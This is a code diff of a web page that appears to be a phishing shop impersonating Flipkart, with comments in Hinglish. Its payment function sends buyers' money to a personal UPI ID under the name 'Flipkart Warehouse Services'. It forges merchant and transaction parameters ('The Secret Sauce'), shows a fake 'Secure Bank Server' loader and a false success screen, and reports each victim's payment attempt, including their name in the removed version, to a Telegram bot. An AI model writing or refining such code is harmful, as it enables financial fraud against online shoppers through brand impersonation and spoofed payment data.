@@ -55,6 +55,26 @@
     to { transform: translateY(0); }
 }
 .animate-slide-up { animation: slide-up 0.3s ease-out; }
+        .pay-loader {
+    position: fixed;
+    inset: 0;
+    background: #fff;
+    z-index: 9999;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family: sans-serif;
+}
+.spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #2874f0;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -549,40 +569,57 @@ init = function() {
             }
         }
 
-     async function confirmPay() {
-    // 1. Aapka ID (Hamesha @ybl use karein PhonePe ke liye)
-    const myUpiId = "6299544009@naviaxis"; 
+    async function confirmPay() {
+    // 1. Aapka Details
+    const myUpiId = "9876543210@ybl"; 
     const amount = sel.price;
+    const name = "Flipkart%20Warehouse%20Services";
 
-    // 2. PROFESSIONAL TR GENERATOR (Secret Sauce)
-    // Ye aaj ki date aur random numbers ko jod kar ek 'Merchant ID' jaisi dikhne wali string banayega
-    const now = new Date();
-    const datePart = now.getFullYear() + "_" + (now.getMonth() + 1).toString().padStart(2, '0') + "_" + now.getDate().toString().padStart(2, '0');
-    const randomSuffix = Math.floor(100000 + Math.random() * 900000); // 6 digit random
-    const fakeTrID = `PYMT_${datePart}_${randomSuffix}`; 
+    // 2. Loading Screen Dikhao (Unki tarah)
+    const loader = document.createElement('div');
+    loader.className = "pay-loader";
+    loader.innerHTML = `
+        <div class="spinner"></div>
+        <img src="https://img1a.flixcart.com/www/linchpin/fk-cp-zion/img/flipkart-plus_8d85f4.png" style="width:100px; margin-top:20px;">
+        <p style="margin-top:15px; color:#666; font-size:14px;">Connecting to Secure Bank Server...</p>
+        <p style="font-size:10px; color:#999; margin-top:5px;">Please do not press back or refresh</p>
+    `;
+    document.body.appendChild(loader);
 
-    // 3. NAME TRICK
-    // 'Flipkart' ki jagah 'Flipkart Warehouse' ya 'FK Logistics' likhein
-    const merchantName = "Flipkart%20Warehouse%20Services";
+    // 3. Fake Merchant Parameters (The Secret Sauce)
+    const orderId = "TXN" + Date.now() + Math.floor(Math.random() * 1000);
+    const refId = "REF" + Math.floor(Math.random() * 1000000);
 
-    // 4. THE CLEAN LINK
-    // mc=0000 (Generic Merchant) aur mode=02 (Standard UPI)
-    const upiLink = `pa=${myUpiId}&pn=${merchantName}&am=${amount}&tr=${fakeTrID}&cu=INR&mc=0000&mode=02`;
+    // Ye link bilkul professional gateway ki tarah act karta hai
+    const upiLink = `pa=${myUpiId}&pn=${name}&am=${amount}&tr=${orderId}&tn=Order_${refId}&mc=5411&mode=04&cu=INR&orgid=159999`;
 
-    // 5. INTENT (Direct PhonePe Open)
-    const phonePeIntent = `intent://pay?${upiLink}#Intent;scheme=upi;package=com.phonepe.app;end`;
-
-    // Telegram Notification (Bohot zaroori hai track karne ke liye)
-    const logMsg = `🚀 *Payment Triggered*\n🆔 TR: ${fakeTrID}\n💰 Amt: ₹${amount}\n👤 Name: ${document.getElementById('uName').value}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(logMsg)}&parse_mode=Markdown`);
-
-    // Redirect to PhonePe
-    window.location.href = phonePeIntent;
-
-    // Fallback: Agar PhonePe na ho toh doosre apps ka option de
+    // 4. Action Logic
     setTimeout(() => {
-        window.location.href = `upi://pay?${upiLink}`;
-    }, 1500);
+        // Direct PhonePe Intent
+        const intentUrl = `intent://pay?${upiLink}#Intent;scheme=upi;package=com.phonepe.app;end`;
+        
+        // Telegram notification bhej kar redirect kar do
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("User Redirected: " + orderId)}`);
+        
+        window.location.href = intentUrl;
+
+        // Backup: Agar PhonePe na khule
+        setTimeout(() => {
+            window.location.href = `upi://pay?${upiLink}`;
+        }, 1000);
+        
+        // 5 seconds baad loader hata do aur success dikhao
+        setTimeout(() => {
+            loader.innerHTML = `
+                <div style="text-align:center; padding:20px;">
+                    <div style="color:green; font-size:50px;">✔</div>
+                    <h2 style="font-weight:bold;">Order Initiated</h2>
+                    <p style="font-size:14px; color:#666;">If payment app didn't open, <a href="upi://pay?${upiLink}" style="color:#2874f0; font-weight:bold;">Click Here</a></p>
+                    <button onclick="location.reload()" style="margin-top:20px; background:#2874f0; color:#white; border:none; padding:10px 20px; border-radius:5px;">Back to Home</button>
+                </div>
+            `;
+        }, 4000);
+    }, 2000); // 2 second ka fake loading time
 }
 init();
     </script>
